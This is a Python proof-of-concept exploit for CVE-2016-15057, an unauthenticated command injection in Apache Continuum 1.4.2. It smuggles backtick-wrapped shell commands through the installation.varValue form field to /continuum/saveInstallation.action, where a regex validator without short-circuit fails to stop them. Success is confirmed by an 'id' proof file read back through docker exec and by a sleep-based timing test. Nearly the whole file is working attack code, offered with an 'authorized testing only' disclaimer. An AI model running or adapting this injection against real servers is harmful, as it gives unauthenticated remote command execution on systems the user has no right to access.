#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Continuum 1.4.2 - Unauthenticated Command Injection (Backtick Substitution)
# CVE            : CVE-2016-15057
# Vendor         : Apache Software Foundation
# Product        : Apache Continuum
# Affected       : All versions (up to 1.4.2)
# Type           : CWE-77 - Command Injection
# CVSS           : 9.9 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 2 for CVE-2016-15057: Backtick Command Injection

Demonstrates command injection using backtick (`command`) substitution
instead of $(command). Backticks do NOT pass the regex validator, but
the validator is NOT configured with short-circuit="true", so the
InstallationValidator custom validator still runs and executes the command.

This proves the regex validation is insufficient as a defense.

Usage:
    python3 poc_vector2_backtick.py <target_host> [port]
"""
import sys
import time
import http.client
import urllib.parse

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "172.19.0.6"
DEFAULT_PORT = 8080
TIMEOUT = 30
PROOF_FILE = "/tmp/cve_2016_15057_backtick_proof"


def banner():
    print(f"""{BOLD}{CYAN}
╔══════════════════════════════════════════════════════════╗
║  CVE-2016-15057 — Apache Continuum Command Injection     ║
║  Vector 2: Backtick (`command`) substitution              ║
║  Note: Fails regex but runs anyway (no short-circuit)    ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def inject_backtick(host, port, command, install_name="backtick_test"):
    """
    Inject command using backtick substitution.

    Backticks (`) are NOT in the regex allowlist, so the regex validator
    will add a field error. However, since the regex validator does NOT use
    short-circuit="true", the installationValidator still runs and triggers
    shell command execution with the tainted varValue.

    The varValue `COMMAND` becomes the executable path, and /bin/sh -c
    processes the backtick substitution.
    """
    # Backtick-wrapped command
    payload = f"`{command}`"

    print(f"{CYAN}[*] Injecting via backtick substitution{RESET}")
    print(f"    Payload: installation.varValue=`{command}`")

    form_data = urllib.parse.urlencode({
        "installation.name": install_name,
        "installation.type": "jdk",
        "installation.varValue": payload,
    })

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        conn = http.client.HTTPConnection(host, port, timeout=TIMEOUT)
        conn.request("POST", "/continuum/saveInstallation.action", body=form_data, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        conn.close()

        print(f"    Response: HTTP {resp.status} ({len(body)} bytes)")
        return resp.status
    except Exception as e:
        print(f"{RED}[-] Request failed: {e}{RESET}")
        return None


def verify(container_name="cve-2016-15057-vulnerable"):
    """Verify by reading proof file from container."""
    import subprocess
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", PROOF_FILE],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0 and result.stdout.strip():
            return True, result.stdout.strip()
        return False, None
    except Exception:
        return False, None


def cleanup(container_name="cve-2016-15057-vulnerable"):
    import subprocess
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", PROOF_FILE],
            capture_output=True, timeout=10
        )
    except Exception:
        pass


def exploit(target_host, target_port):
    banner()

    cleanup()

    # Test 1: File-based proof with backtick injection
    print(f"{CYAN}[*] Test 1: File-based proof via backtick injection{RESET}")
    command = f"id > {PROOF_FILE}"
    status = inject_backtick(target_host, target_port, command)

    if status is None:
        print(f"{RED}[-] Request failed{RESET}")
        return False

    time.sleep(2)
    confirmed, proof = verify()

    if confirmed:
        print(f"{GREEN}{BOLD}[+] BACKTICK INJECTION CONFIRMED!{RESET}")
        print(f"{GREEN}[+] Proof: {proof}{RESET}")
    else:
        print(f"{YELLOW}[!] File proof not found, trying time-based...{RESET}")

    # Test 2: Time-based verification
    print(f"\n{CYAN}[*] Test 2: Time-based verification via backtick injection{RESET}")
    delay = 5
    start = time.time()
    inject_backtick(target_host, target_port, f"sleep {delay}", install_name="backtick_time")
    elapsed = time.time() - start

    time_confirmed = elapsed >= (delay - 1)
    print(f"    Response time: {elapsed:.1f}s (expected >= {delay}s)")
    if time_confirmed:
        print(f"{GREEN}[+] Time-based backtick injection confirmed!{RESET}")

    # Summary
    print(f"\n{'='*60}")
    if confirmed:
        print(f"{GREEN}{BOLD}[✓] VECTOR 2 CONFIRMED: Backtick injection works{RESET}")
        print(f"{GREEN}    Regex validator rejects backticks but NO short-circuit{RESET}")
        print(f"{GREEN}    InstallationValidator still executes the shell command{RESET}")
    elif time_confirmed:
        print(f"{YELLOW}{BOLD}[~] VECTOR 2 LIKELY: Time-based delay detected{RESET}")
    else:
        print(f"{RED}{BOLD}[✗] VECTOR 2 UNVERIFIED{RESET}")
    print(f"{'='*60}")

    return confirmed or time_confirmed


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    success = exploit(target, port)
    sys.exit(0 if success else 1)
